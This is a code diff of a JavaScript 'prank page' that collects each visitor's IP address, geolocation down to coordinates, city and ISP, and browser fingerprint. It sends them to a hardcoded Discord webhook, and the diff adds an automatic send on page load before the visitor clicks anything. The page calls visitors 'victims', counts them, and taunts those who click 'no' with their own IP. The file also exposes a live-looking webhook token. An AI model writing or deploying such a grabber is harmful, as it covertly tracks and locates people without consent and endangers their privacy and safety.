@@ -52,8 +52,8 @@
     const yesButton = document.querySelector('button:first-of-type');
     const noButton = document.querySelector('button:last-of-type');
     const webhookUrl = 'https://discord.com/api/webhooks/1437139077714411624/UGLtXYwbnVJsgG5mayU6fyq4p0HqDMEDlg_6V6U8rZRc0FjxXk5y-2W0bohbzTsL3QAk';
-    let clicked = false;
-    let victimInfo = null;
+    let currentIp = null;
+    let geoData = null;
     const counterKey = 'totalVictims';
     let totalVictims = parseInt(localStorage.getItem(counterKey)) || 0;
     totalVictims++;
@@ -89,24 +89,44 @@
         body: JSON.stringify({ embeds: [fullEmbed] }),
       }).catch(console.error);
     };
-    const buildEmbed = (ip, geoData) => {
-      const lat = geoData.lat || 'unknown';
-      const lon = geoData.lon || 'unknown';
-      const country = geoData.country || 'unknown';
-      const countryCode = geoData.countryCode || 'unknown';
-      const region = geoData.regionName || 'unknown';
-      const regionCode = geoData.region || 'unknown';
-      const city = geoData.city || 'unknown';
-      const district = geoData.district || 'unknown';
-      const zip = geoData.zip || 'unknown';
-      const isp = geoData.isp || 'unknown';
-      const org = geoData.org || 'unknown';
-      const as = geoData.as || 'unknown';
-      const timezone = geoData.timezone || 'unknown';
-      const mobile = geoData.mobile ? 'Yes' : 'No';
-      const proxy = geoData.proxy ? 'Yes' : 'No';
-      const hosting = geoData.hosting ? 'Yes' : 'No';
-      const status = geoData.status || 'unknown';
+    const buildBasicEmbed = (ip) => {
+      const userAgent = navigator.userAgent || 'unknown';
+      const language = navigator.language || 'unknown';
+      const platform = navigator.platform || 'unknown';
+      const screenRes = `${screen.width}x${screen.height}` || 'unknown';
+      const cookieEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
+      const timestamp = new Date().toISOString();
+      return {
+        description: `Timestamp: ${timestamp}`,
+        fields: [
+          { name: 'IP', value: ip, inline: true },
+          { name: 'User Agent', value: userAgent, inline: false },
+          { name: 'Language', value: language, inline: true },
+          { name: 'Platform', value: platform, inline: true },
+          { name: 'Screen Resolution', value: screenRes, inline: true },
+          { name: 'Cookies Enabled', value: cookieEnabled, inline: true }
+        ],
+        footer: { text: 'Grabbed via prank page' }
+      };
+    };
+    const buildFullEmbed = (ip, gData) => {
+      const lat = gData.lat || 'unknown';
+      const lon = gData.lon || 'unknown';
+      const country = gData.country || 'unknown';
+      const countryCode = gData.countryCode || 'unknown';
+      const region = gData.regionName || 'unknown';
+      const regionCode = gData.region || 'unknown';
+      const city = gData.city || 'unknown';
+      const district = gData.district || 'unknown';
+      const zip = gData.zip || 'unknown';
+      const isp = gData.isp || 'unknown';
+      const org = gData.org || 'unknown';
+      const as = gData.as || 'unknown';
+      const timezone = gData.timezone || 'unknown';
+      const mobile = gData.mobile ? 'Yes' : 'No';
+      const proxy = gData.proxy ? 'Yes' : 'No';
+      const hosting = gData.hosting ? 'Yes' : 'No';
+      const status = gData.status || 'unknown';
       const userAgent = navigator.userAgent || 'unknown';
       const language = navigator.language || 'unknown';
       const platform = navigator.platform || 'unknown';
@@ -142,70 +162,66 @@
         footer: { text: 'Grabbed via prank page' }
       };
     };
-    const fetchVictimInfo = () => {
-      return fetch('https://api.ipify.org?format=json')
+    const fetchAndSendBasic = () => {
+      fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
         .then(data => {
-          const ip = data.ip;
-          console.log('Your IP:', ip);
-          return fetch(`http://ip-api.com/json/${ip}`)
+          currentIp = data.ip;
+          console.log('Your IP:', currentIp);
+          const basicEmbed = buildBasicEmbed(currentIp);
+          sendEmbed(basicEmbed, 10197915, 'New Victim Entry');
+          fetch(`http://ip-api.com/json/${currentIp}`)
             .then(geoResponse => geoResponse.json())
-            .then(geoData => {
-              return { ip, embed: buildEmbed(ip, geoData) };
+            .then(gData => {
+              geoData = gData;
+              console.log('Geo data fetched');
+            })
+            .catch(error => {
+              console.error('Error fetching geo:', error);
             });
         })
         .catch(error => {
-          console.error('Error fetching info:', error);
-          return null;
+          console.error('Error fetching IP:', error);
         });
     };
     sendNewVictim();
-    const infoPromise = fetchVictimInfo();
-    infoPromise.then(v => {
-      if (v) {
-        victimInfo = v;
-      }
-    });
-    setTimeout(() => {
-      if (!clicked) {
-        if (victimInfo) {
-          sendEmbed(victimInfo.embed, 10197915, "Victim didn't decide in time");
-        } else {
-          fetchVictimInfo().then(v => {
-            if (v) {
-              sendEmbed(v.embed, 10197915, "Victim didn't decide in time");
-            }
-          });
-        }
-      }
-    }, 10000);
+    fetchAndSendBasic();
     yesButton.addEventListener('click', () => {
-      clicked = true;
       alert('cool thanks!');
-      if (victimInfo) {
-        sendEmbed(victimInfo.embed, 65280, 'Victim Agreed');
+      if (geoData) {
+        const fullEmbed = buildFullEmbed(currentIp, geoData);
+        sendEmbed(fullEmbed, 65280, 'Victim Agreed');
       } else {
-        fetchVictimInfo().then(v => {
-          if (v) {
-            sendEmbed(v.embed, 65280, 'Victim Agreed');
-          }
-        });
+        fetch(`http://ip-api.com/json/${currentIp}`)
+          .then(geoResponse => geoResponse.json())
+          .then(gData => {
+            const fullEmbed = buildFullEmbed(currentIp, gData);
+            sendEmbed(fullEmbed, 65280, 'Victim Agreed');
+          })
+          .catch(() => {
+            const basicEmbed = buildBasicEmbed(currentIp);
+            sendEmbed(basicEmbed, 65280, 'Victim Agreed');
+          });
       }
     });
     noButton.addEventListener('click', () => {
-      clicked = true;
-      if (victimInfo) {
-        sendEmbed(victimInfo.embed, 16711680, 'Victim Refused');
-        alert(`no?? Then your ip shall be mine, its ${victimInfo.ip} btw`);
+      if (geoData) {
+        const fullEmbed = buildFullEmbed(currentIp, geoData);
+        sendEmbed(fullEmbed, 16711680, 'Victim Refused');
+        alert(`no?? Then your ip shall be mine, its ${currentIp} btw`);
       } else {
-        fetchVictimInfo().then(v => {
-          if (v) {
-            sendEmbed(v.embed, 16711680, 'Victim Refused');
-            alert(`no?? Then your ip shall be mine, its ${v.ip} btw`);
-          } else {
-            alert('no?? Then your ip shall be mine, its [error] btw');
-          }
-        });
+        fetch(`http://ip-api.com/json/${currentIp}`)
+          .then(geoResponse => geoResponse.json())
+          .then(gData => {
+            const fullEmbed = buildFullEmbed(currentIp, gData);
+            sendEmbed(fullEmbed, 16711680, 'Victim Refused');
+            alert(`no?? Then your ip shall be mine, its ${currentIp} btw`);
+          })
+          .catch(() => {
+            const basicEmbed = buildBasicEmbed(currentIp);
+            sendEmbed(basicEmbed, 16711680, 'Victim Refused');
+            alert(`no?? Then your ip shall be mine, its ${currentIp} btw`);
+          });
       }
     });
   </script>
